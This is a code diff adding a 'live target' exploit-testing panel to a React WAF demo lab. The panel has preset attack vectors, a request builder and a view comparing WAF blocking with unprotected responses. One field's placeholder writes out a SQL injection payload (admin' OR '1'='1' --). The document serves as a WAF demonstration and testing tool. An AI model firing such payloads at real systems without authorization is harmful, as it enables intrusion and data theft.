+                ════════════════════════════════════════════════════════════════ */}
+                {(liveViewMode === "exploit" || liveViewMode === "split") && (
+                  <div className="space-y-4">
+                    {/* Quick Exploit Vector Presets */}
+                    <div className="rounded-2xl border border-slate-200 bg-white p-4 shadow-sm space-y-2.5">
+                      <div className="flex items-center justify-between">
+                        <span className="text-xs font-bold text-slate-800 flex items-center gap-1.5">
+                          <Flame className="size-3.5 text-red-600" />
+                          Pre-Configured Exploit Vectors (Click to Load):
+                        </span>
+                        <span className="text-[10px] text-slate-500 font-mono">
+                          {LIVE_PRESETS.length} Vectors Available
+                        </span>
+                      </div>
+
+                      <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 xl:grid-cols-4 gap-2">
+                        {LIVE_PRESETS.map((preset) => (
+                          <button
+                            key={preset.id}
+                            type="button"
+                            onClick={() => handleSelectPreset(preset)}
+                            className={cn(
+                              "flex flex-col items-start p-2.5 rounded-xl border text-left transition-all cursor-pointer",
+                              selectedPresetId === preset.id
+                                ? "border-cyan-600 bg-cyan-50/70 text-cyan-900 shadow-sm ring-1 ring-cyan-600"
+                                : "border-slate-200 bg-slate-50/50 hover:bg-slate-100/80 text-slate-700"
+                            )}
+                          >
+                            <div className="flex items-center justify-between w-full mb-1">
+                              <span className="rounded bg-slate-200 px-1.5 py-0.5 font-mono text-[8px] font-black text-slate-800">
+                                {preset.category}
+                              </span>
+                              <span className="font-mono text-[9px] font-bold text-cyan-700">{preset.method}</span>
+                            </div>
+                            <span className="text-xs font-bold leading-snug line-clamp-1">{preset.name}</span>
+                            <span className="text-[10px] text-slate-500 line-clamp-1 mt-0.5">{preset.path}</span>
+                          </button>
+                        ))}
+                      </div>
+                    </div>
+
+                    {/* Request Builder Form */}
+                    <div className="rounded-2xl border border-slate-200 bg-white p-4 shadow-sm space-y-3">
+                      <div className="flex items-center justify-between border-b border-slate-100 pb-2.5">
+                        <span className="text-xs font-bold text-slate-800 flex items-center gap-1.5">
+                          <Terminal className="size-3.5 text-cyan-600" />
+                          HTTP Probe Configuration
+                        </span>
+                        <span className="text-[10px] font-mono text-slate-500">
+                          Target: {targetUrlInput || "http://localhost:8080"}
+                        </span>
+                      </div>
+
+                      <div className="grid grid-cols-1 sm:grid-cols-12 gap-2.5 items-center">
+                        <div className="sm:col-span-3">
+                          <label className="block text-[10px] font-bold uppercase tracking-wider text-slate-500 mb-1">
+                            HTTP Method
+                          </label>
+                          <Select value={customMethod} onValueChange={(v) => setCustomMethod(v as HttpMethod)}>
+                            <SelectTrigger className="h-9 font-mono text-xs font-bold bg-slate-50 border-slate-300">
+                              <SelectValue />
+                            </SelectTrigger>
+                            <SelectContent>
+                              <SelectItem value="GET">GET</SelectItem>
+                              <SelectItem value="POST">POST</SelectItem>
+                              <SelectItem value="PUT">PUT</SelectItem>
+                              <SelectItem value="DELETE">DELETE</SelectItem>
+                              <SelectItem value="PATCH">PATCH</SelectItem>
+                            </SelectContent>
+                          </Select>
+                        </div>
+
+                        <div className="sm:col-span-9">
+                          <label className="block text-[10px] font-bold uppercase tracking-wider text-slate-500 mb-1">
+                            Endpoint Path / Query
+                          </label>
+                          <Input
+                            value={customPath}
+                            onChange={(e) => setCustomPath(e.target.value)}
+                            placeholder="/api/login"
+                            className="h-9 font-mono text-xs bg-slate-50 border-slate-300"
+                          />
+                        </div>
+                      </div>
+
+                      <div>
+                        <label className="block text-[10px] font-bold uppercase tracking-wider text-slate-500 mb-1">
+                          Request Headers
+                        </label>
+                        <Input
+                          value={customHeaders}
+                          onChange={(e) => setCustomHeaders(e.target.value)}
+                          placeholder="Content-Type: application/x-www-form-urlencoded"
+                          className="h-8 font-mono text-xs bg-slate-50 border-slate-300"
+                        />
+                      </div>
+
+                      <div>
+                        <div className="flex items-center justify-between mb-1">
+                          <label className="text-[10px] font-bold uppercase tracking-wider text-slate-500">
+                            Exploit Payload / Request Body
+                          </label>
+                          <span className="font-mono text-[9px] text-slate-400">
+                            {customPayload.length} chars · High Threat Vector
+                          </span>
+                        </div>
+                        <Textarea
+                          value={customPayload}
+                          onChange={(e) => setCustomPayload(e.target.value)}
+                          rows={3}
+                          placeholder="Enter raw exploit payload (e.g., admin' OR '1'='1' --)"
+                          className="font-mono text-xs bg-slate-900 text-cyan-300 border-slate-700 resize-none"
+                        />
+                      </div>
+
+                      {/* Action Buttons */}
+                      <div className="flex flex-wrap items-center justify-between gap-2 pt-1">
+                        <div className="flex items-center gap-2">
+                          <Button
+                            type="button"
+                            disabled={executingLive}
+                            onClick={handleExecuteLiveProbe}
+                            className={cn(
+                              "h-9 px-4 gap-2 font-bold text-xs rounded-xl shadow-sm text-white",
+                              activeWaf
+                                ? "bg-emerald-600 hover:bg-emerald-700"
+                                : "bg-red-600 hover:bg-red-700"
+                            )}
+                          >
+                            {executingLive ? (
+                              <>
+                                <RefreshCw className="size-3.5 animate-spin" />
+                                <span>Executing Probe...</span>
+                              </>
+                            ) : (
+                              <>
+                                <Zap className="size-3.5" />
+                                <span>{activeWaf ? "Test Exploit (WAF Intercept)" : "Fire Exploit (Origin Direct)"}</span>
+                              </>
+                            )}
+                          </Button>
+
+                          <Button
+                            type="button"
+                            variant="outline"
+                            size="sm"
+                            onClick={() => setInternalWafOn((v) => !v)}
+                            className="h-9 gap-1.5 text-xs font-semibold border-slate-300 hover:bg-slate-100 cursor-pointer"
+                          >
+                            {activeWaf ? <ShieldOff className="size-3.5 text-red-600" /> : <ShieldCheck className="size-3.5 text-emerald-600" />}
+                            <span>Switch to {activeWaf ? "WAF OFF" : "WAF ON"}</span>
+                          </Button>
+                        </div>
+
+                        <span className="text-[10px] text-slate-500 font-mono">
+                          Proxied via WebGuard Edge Rule Engine
+                        </span>
+                      </div>
+                    </div>
+                  </div>
+                )}
+
+                {/* Live Target Response Card */}
+                {liveTargetResponse ? (
+                  <div
+                    className={cn(
+                      "rounded-2xl border p-4.5 space-y-3.5 shadow-sm transition-all animate-in fade-in",
+                      liveTargetResponse.blocked
+                        ? "border-emerald-300 bg-emerald-50/60 text-slate-900"
+                        : "border-red-300 bg-red-50/60 text-slate-900"
+                    )}
+                  >
+                    {/* Banner Header */}
+                    <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b pb-3 border-current/10">
+                      <div className="flex items-center gap-2.5">
+                        <span
+                          className={cn(
+                            "flex size-8 items-center justify-center rounded-xl text-white font-black text-sm",
+                            liveTargetResponse.blocked ? "bg-emerald-600" : "bg-red-600"
+                          )}
+                        >
+                          {liveTargetResponse.blocked ? "🛡️" : "💥"}
+                        </span>
+                        <div>
+                          <div className="flex items-center gap-2">
+                            <h4 className="font-extrabold text-sm text-slate-900">
+                              {liveTargetResponse.blocked
+                                ? "403 Forbidden — Blocked by WebGuard AI WAF"
+                                : "200 OK — Origin Vulnerability Exploited!"}
+                            </h4>
+                            <Badge
+                              className={cn(
+                                "font-mono text-[9px] font-black",
+                                liveTargetResponse.blocked ? "bg-emerald-600 text-white" : "bg-red-600 text-white"
+                              )}
+                            >
+                              HTTP {liveTargetResponse.status}
+                            </Badge>
+                          </div>
+                          <p className="text-[11px] text-slate-600 mt-0.5">
+                            {liveTargetResponse.blocked
+                              ? `Virtual patch ${liveTargetResponse.ruleMatched} dropped the exploit at edge in ${liveTargetResponse.latencyMs}ms.`
+                              : `Target origin executed unescaped payload and returned raw sensitive data in ${liveTargetResponse.latencyMs}ms.`}
+                          </p>
+                        </div>
+                      </div>
+
+                      <Button
+                        size="sm"
+                        onClick={() => {
+                          setInternalWafOn(!activeWaf);
+                          setTimeout(() => handleExecuteLiveProbe(), 50);
+                        }}
+                        className={cn(
+                          "h-8 text-xs font-bold rounded-xl text-white shadow-sm shrink-0 cursor-pointer",
+                          liveTargetResponse.blocked
+                            ? "bg-red-600 hover:bg-red-700"
+                            : "bg-emerald-600 hover:bg-emerald-700"
+                        )}
+                      >
+                        {liveTargetResponse.blocked ? "🔄 Turn WAF OFF & Re-Test" : "🛡️ Turn WAF ON & Re-Test"}
+                      </Button>
+                    </div>
+
+                    {/* Evidence Banner */}
+                    <div className="rounded-xl border border-slate-200 bg-white p-3 space-y-1.5 font-mono text-xs shadow-sm">
+                      <div className="flex items-center justify-between text-[10px] font-bold text-slate-500 uppercase tracking-wider">
+                        <span>{liveTargetResponse.blocked ? "WAF Edge Enforcement Proof" : "Extracted Origin Vulnerability Evidence"}</span>
+                        <span className="text-cyan-700">Threat Score: {liveTargetResponse.threatScore}/100</span>
+                      </div>
+                      <p className="text-[11px] font-semibold text-slate-800">
+                        {liveTargetResponse.evidence}
+                      </p>
+                    </div>
+
+                    {/* Response Body Preview */}
+                    <div className="space-y-1.5">
+                      <div className="flex items-center justify-between text-[10px] font-bold uppercase tracking-wider text-slate-600">
+                        <span>HTTP Response Body ({liveTargetResponse.body.length} bytes)</span>
+                        <span className="font-mono text-slate-400">Target: {liveTargetResponse.targetUrl}</span>
+                      </div>
+                      <pre className="max-h-48 overflow-y-auto rounded-xl bg-slate-900 p-3 font-mono text-xs leading-relaxed text-emerald-400 shadow-inner">
+                        {liveTargetResponse.body}
+                      </pre>
+                    </div>
+                  </div>
+                ) : (
+                  <div className="rounded-2xl border border-dashed border-slate-300 bg-white p-6 text-center space-y-2">
+                    <Globe2 className="size-8 text-slate-300 mx-auto" />
+                    <h4 className="text-xs font-bold text-slate-700">Ready to test live target</h4>
+                    <p className="text-[11px] text-slate-500 max-w-md mx-auto">
+                      Choose a preset exploit vector above or customize your HTTP method, headers, and payload, then click{" "}
+                      <strong className="text-cyan-700">Test Exploit</strong> to observe live WAF mitigation vs raw exploitation.
+                    </p>
+                  </div>
+                )}
+              </div>
+            ) : (
+              <>
+                {/* Store Top Navigation Bar */}
+                <div className="flex flex-wrap items-center justify-between border-b border-slate-200 bg-slate-50/90 px-4 py-2.5 gap-2">
               {/* Brand Logo */}
               <button
                 type="button"
@@ -2260,12 +3177,17 @@ export function WebLabTab({
                 </>
               )}
             </div>
+            </>
+            )}
 
             {/* In-Browser Footer */}
             <div className="border-t border-slate-200 bg-slate-100/90 px-5 py-2.5 flex items-center justify-between text-[10px] text-slate-500">
               <span>© 2026 Apex CyberStore Systems · Protected by WebGuard AI WAF</span>
               <span className="flex items-center gap-1 font-mono">
-                Reverse Proxy Target: <span className="text-cyan-700 font-bold">http://127.0.0.1:8080</span>
+                Reverse Proxy Target:{" "}
+                <span className="text-cyan-700 font-bold">
+                  {labMode === "live-target" ? targetUrlInput || "http://localhost:8080" : "http://127.0.0.1:8080"}
+                </span>
               </span>
             </div>
           </div>
